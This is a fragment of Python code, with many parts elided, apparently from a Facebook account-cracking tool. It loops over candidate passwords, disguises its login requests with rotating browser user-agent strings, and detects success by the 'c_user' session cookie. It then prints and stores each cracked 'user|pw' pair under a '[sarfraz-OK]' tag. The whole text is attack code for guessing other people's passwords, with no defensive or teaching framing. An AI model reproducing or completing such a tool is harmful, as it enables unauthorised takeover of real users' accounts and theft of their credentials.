...
header_grup = {"user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.236 Safari/537.36;]"}
        ...
        try:
            for pw in __chi__:
                ...
                header = {
                    ...
                    "user-agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.81 Safari/537.36",
                ...
                header1 = {
                    ...
                    "user-agent":"Mozilla/5.0 (Android 5; Mobile; rv:96.0.0) Gecko/96.0.0 Firefox/96.0.",
                    "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [sarfraz-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
